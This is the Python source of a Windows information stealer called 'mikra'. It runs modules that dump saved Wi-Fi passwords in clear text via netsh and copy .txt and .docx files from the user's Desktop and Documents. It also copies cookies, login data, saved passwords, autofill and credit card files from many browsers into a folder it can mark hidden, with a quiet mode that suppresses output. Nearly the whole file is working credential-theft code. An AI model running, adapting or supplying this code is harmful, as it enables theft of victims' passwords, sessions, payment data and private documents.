#!/usr/bin/python
# -*- coding: utf-8 -*-
import ctypes
import datetime
import fnmatch
import getpass
import locale
import os
import platform
import shutil
import socket
import subprocess
import sys
import requests
import netifaces
import GPUtil
import psutil
from win32com.client import GetObject
from win32api import GetSystemMetrics
from shutil import copyfile

try:
    if __name__ == "__main__":
        if "all" in str(sys.argv) or "network" in str(sys.argv) or "hardware" in str(sys.argv) or "filegraber" in str(
                sys.argv) or "browsers" in str(sys.argv):
            windll = ctypes.windll.kernel32
            lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
            encoding = locale.getpreferredencoding()
            typeos = platform.system() + " " + platform.release()
            timedate = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
            time = datetime.datetime.now().strftime("%H:%M:%S").replace(":", "-", 2)
            user = getpass.getuser()
            hostname = socket.gethostname()
            iip = socket.gethostbyname(socket.gethostname())
            gatewayip = netifaces.gateways()['default'][netifaces.AF_INET][0]
            prefix = "{~}"
            timedate = prefix + " " + timedate
            dirname = user + "_" + time
            dio = dirname
            os.makedirs(dirname)

            try:
                response = requests.get('https://ipinfo.io/json')
                r = response.json()
                eip = r['ip']
            except:
                eip = "Error"
                pass

            try:
                output = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode(encoding).split('\n')
                bssidstr = str(output[9]).replace("    BSSID                  :", "")
            except Exception:
                bssidstr = "Error"
                pass

            logfile = open(dio + "\\" + user + "-log" + ".json", "w")
            logfile.write("""
	 ___      ___   __     __   ___   _______        __      
	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\  \ 
	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)


{0}
(
	System: {1}
	Hostname: {2}
	Username: {3}
	Language: {4}""".format(timedate, typeos, hostname, user, lang))


            def findd(pattern, path, pok):
                global result
                result = 0
                for root, dirs, files in os.walk(path):
                    for name in files:
                        if fnmatch.fnmatch(name, pattern):
                            try:
                                fileg = os.path.join(root, name)
                                copyfile(fileg, dio + pok + name)
                                result += 1
                            except Exception:
                                pass


            if "-q" not in str(sys.argv):
                print("""
	 ___      ___   __     __   ___   _______        __      
	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\   \ 
	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)
                                                         
			""")
                print(timedate, "\n(")
                print("	System: " + typeos)
                print("	Hostname: ", hostname)
                print(" 	Username: ", user)
                print(" 	Language: ", lang)


            def networkpass(one, two):
                try:
                    cost = 0
                    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(encoding).split('\n')
                    profiles = [i.split(":")[1][1:-1] for i in data if one in i]
                    if "-q" not in str(sys.argv):
                        print(" 	 Wi-Fi's [")
                    logfile.write("	 Wi-Fi's [\n")
                    for i in profiles:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                            encoding).split('\n')
                        results = [b.split(":")[1][1:-1] for b in results if two in b]
                        try:
                            if "-q" not in str(sys.argv):
                                print("	   {0}:{1}".format(i, results[0]))
                            logfile.write("		{0}:{1}\n".format(i, results[0]))
                            cost += 1
                        except IndexError:
                            if "-q" not in str(sys.argv):
                                print("	   {0}:{1}".format(i, ""))
                            logfile.write("		{0}:{1}\n".format(i, ""))

                except Exception:
                    pass


            if "all" in str(sys.argv) or "network" in str(sys.argv):
                if "-q" not in str(sys.argv):
                    print(" 	{~} Network: ")
                    print(" 	 External ip: ", eip)
                    print(" 	 Internal ip: ", iip)
                    print(" 	 Gateway ip: ", gatewayip)
                    print(" 	 BSSID:", bssidstr)
                    logfile.write("""
    {0} Network: 
     External ip: {1}
     Internal ip: {2}
     Gateway ip: {3}
     BSSID:{4}""".format(prefix, eip, iip, gatewayip, bssidstr))
                if lang == "en_US":
                    networkpass("All User Profile", "Key Content")
                    if "-q" not in str(sys.argv):
                        print("	 ]")
                    logfile.write("	 ]")
                elif lang == "ru_RU":
                    networkpass("Все профили пользователей", "Содержимое ключа")
                    if "-q" not in str(sys.argv):
                        print("	 ]")
                    logfile.write("	 ]")

            if "all" in str(sys.argv) or "hardware" in str(sys.argv):
                def get_cpu_type():
                    root_winmgmts = GetObject("winmgmts:root\cimv2")
                    cpus = root_winmgmts.ExecQuery("Select * from Win32_Processor")
                    return cpus[0].Name


                def get_size(bytes, suffix="B"):
                    factor = 1024
                    for unit in ["", "K", "M", "G", "T", "P"]:
                        if bytes < factor:
                            return f"{bytes:.2f}{unit}{suffix}"
                        bytes /= factor


                gpus = GPUtil.getGPUs()
                for gpu in gpus:
                    gpu_name = gpu.name

                svmem = psutil.virtual_memory()
                print(" 	{~} Hardware: ")
                print(" 	 CPU: ", get_cpu_type())
                print(" 	 GPU: ", gpu_name)
                print(" 	 RAM: ", get_size(svmem.total))
                print(" 	 Resolution: ", str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1)))
                logfile.write("""
    {0} Hardware:
     CPU: {1}
     GPU: {2}
     RAM: {3}
     Resolution: {4}""".format(prefix, get_cpu_type(), gpu_name, get_size(svmem.total),
                               str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1))))

            if "all" in str(sys.argv) or "filegraber" in str(sys.argv):
                os.makedirs(dio + "\\Documents")
                findd("*.txt", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
                res1t = "%.2i" % result
                findd("*.txt", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
                resst = int(res1t) + int("%.2i" % result)
                findd("*.docx", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
                res1w = "%.2i" % result
                findd("*.docx", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
                ressw = int(res1w) + int("%.2i" % result)
                if "-q" not in str(sys.argv):
                    print(" 	{~} File graber: ")
                    print(" 	 Found .txt: ", resst)
                    print(" 	 Found .docx: ", ressw)
                logfile.write("""
    {0} File graber:
     Found .txt: {1}
     Found .docx: {2}""".format(prefix, resst, ressw))


            def browsers():
                def find(pattern, path, pok):
                    global result
                    result = 0
                    for root, dirs, files in os.walk(path):
                        for name in files:
                            if fnmatch.fnmatch(name, pattern):
                                try:
                                    fileg = os.path.join(root, name)
                                    copyfile(fileg, dio + pok + name)
                                    result += 1
                                    return True
                                except Exception as exx:
                                    print(exx)
                                    return False

                def checkp(title):
                    if "-q" not in str(sys.argv):
                        print(title)

                if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)
                    if os.path.exists(dio + "\\Google Chrome"):
                        shutil.rmtree(dio + "\\Google Chrome")
                    os.makedirs(dio + "\\Google Chrome")
                    checkp(" 	{~} Google Chrome:")
                    try:
                        if find("Cookies", src, "\\Google Chrome\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Google Chrome\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Google Chrome\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Google Chrome\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Google Chrome\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\".format(user)
                    if os.path.exists(dio + "\\Opera GX"):
                        shutil.rmtree(dio + "\\Opera GX")
                    os.makedirs(dio + "\\Opera GX")
                    checkp(" 	{~} Opera GX:")
                    try:
                        if find("Cookies", src, "\\Opera GX\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Opera GX\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Opera GX\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Opera GX\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Opera GX\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable\\".format(user)
                    if os.path.exists(dio + "\\Opera"):
                        shutil.rmtree(dio + "\\Opera")
                    os.makedirs(dio + "\\Opera")
                    checkp(" 	{~} Opera:")
                    try:
                        if find("Cookies", src, "\\Opera\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Opera\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Opera\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Opera\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Opera\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles\\".format(user)
                    if os.path.exists(dio + "\\Firefox"):
                        shutil.rmtree(dio + "\\Firefox")
                    os.makedirs(dio + "\\Firefox")
                    checkp(" 	{~} Firefox:")
                    try:
                        if find("cookies.sqlite", src, "\\Firefox\\"):
                            checkp(" 	 + Cookies")
                        if find("places.sqlite", src, "\\Firefox\\"):
                            checkp(" 	 + History")
                            checkp(" 	 + Bookmarks")
                        if find("key4.db", src, "\\Firefox\\"):
                            checkp(" 	 + Saved Passwords")
                        if find("logins.json", src, "\\Firefox\\"):
                            checkp(" 	 + Login Data")
                        if find("formhistory.sqlite", src, "\\Firefox\\"):
                            checkp(" 	 + Form Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists(
                        "C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)
                    if os.path.exists(dio + "\\Yandex"):
                        shutil.rmtree(dio + "\\Yandex")
                    os.makedirs(dio + "\\Yandex")
                    checkp(" 	{~} Yandex:")
                    try:
                        if find("Cookies", src, "\\Yandex\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Yandex\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Yandex\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Yandex\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Yandex\\"):
                            checkp(" 	 + Web Data")
                        if find("Ya Autofill Data", src, "\\Yandex\\"):
                            checkp(" 	 + Autofill Data")
                        if find("Ya Credit Cards", src, "\\Yandex\\"):
                            checkp(" 	 + Credit Cards Data")
                        if find("Ya Passman Data", src, "\\Yandex\\"):
                            checkp(" 	 + Passman Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)
                    if os.path.exists(dio + "\\Vivaldi"):
                        shutil.rmtree(dio + "\\Vivaldi")
                    os.makedirs(dio + "\\Vivaldi")
                    checkp(" 	{~} Vivaldi:")
                    try:
                        if find("Cookies", src, "\\Vivaldi\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Vivaldi\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Vivaldi\\"):
                            checkp(" 	 + History")
                        if find("Web Data", src, "\\Vivaldi\\"):
                            checkp(" 	 + Web Data")
                        if find("Login Data", src, "\\Vivaldi\\"):
                            checkp(" 	 + Login Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists(
                        "C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)):
                    src = "C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)
                    if os.path.exists(dio + "\\Brave"):
                        shutil.rmtree(dio + "\\Brave")
                    os.makedirs(dio + "\\Brave")
                    checkp(" 	{~} Brave:")
                    try:
                        if find("Cookies", src, "\\Brave\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Brave\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Brave\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Brave\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Brave\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Chrome Canary"):
                        shutil.rmtree(dio + "\\Chrome Canary")
                    os.makedirs(dio + "\\Chrome Canary")
                    checkp(" 	 {~} Chrome Canary:")
                    try:
                        if find("Cookies", src, "\\Chrome Canary\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Chrome Canary\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Chrome Canary\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Chrome Canary\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Chrome Canary\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Chromium"):
                        shutil.rmtree(dio + "\\Chromium")
                    os.makedirs(dio + "\\Chromium")
                    checkp(" 	 {~} Chromium:")
                    try:
                        if find("Cookies", src, "\\Chromium\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Chromium\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Chromium\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Chromium\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Chromium\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)
                    if os.path.exists(dio + "\\CocCoc"):
                        shutil.rmtree(dio + "\\CocCoc")
                    os.makedirs(dio + "\\CocCoc")
                    checkp(" 	{~} CocCoc:")
                    try:
                        if find("Cookies", src, "\\CocCoc\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\CocCoc\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\CocCoc\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\CocCoc\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\CocCoc\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Atom"):
                        shutil.rmtree(dio + "\\Atom")
                    os.makedirs(dio + "\\Atom")
                    checkp(" 	{~} Atom:")
                    try:
                        if find("Cookies", src, "\\Atom\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Atom\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Atom\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Atom\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Atom\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Orbitum"):
                        shutil.rmtree(dio + "\\Orbitum")
                    os.makedirs(dio + "\\Orbitum")
                    checkp(" 	 {~} Orbitum")
                    try:
                        if find("Cookies", src, "\\Orbitum\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Orbitum\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Orbitum\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Orbitum\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Orbitum\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)

                if os.path.exists("C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Torch"):
                        shutil.rmtree(dio + "\\Torch")
                    os.makedirs(dio + "\\Torch")
                    checkp(" 	 {~} Torch")
                    try:
                        if find("Cookies", src, "\\Torch\\"):
                            checkp(" 	 + Cookies")
                        if find("Bookmarks", src, "\\Torch\\"):
                            checkp(" 	 + Bookmarks")
                        if find("History", src, "\\Torch\\"):
                            checkp(" 	 + History")
                        if find("Login Data", src, "\\Torch\\"):
                            checkp(" 	 + Login Data")
                        if find("Web Data", src, "\\Torch\\"):
                            checkp(" 	 + Web Data")
                    except Exception as ex:
                        print(ex)


            if "all" in str(sys.argv) or "browsers" in str(sys.argv):
                browsers()

            logfile.write("\n)")
            logfile.close()

            if "-xh" in str(sys.argv):
                ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
            if "-q" not in str(sys.argv):
                sys.exit(")")
        else:
            print("""
	 ___      ___   __     __   ___   _______        __      
	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\  \ 
	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)


Usage: mikra.exe [-h] [-xh] [-q]
		 {all, network, hardware, filegraber, browsers}

Positional arguments:
 all		Launches all modules
 network	Launches network module
 hardware	Launches hardware module
 filegraber	Launches file graber module
 browsers	Launches browsers module

Optional arguments:
 -h		Show help.
 -q		Nothing will be print.
 -xh		Set hidden attribute to mikra dir.""")
except KeyboardInterrupt:
    sys.exit("\nKeyboardInterrupt")
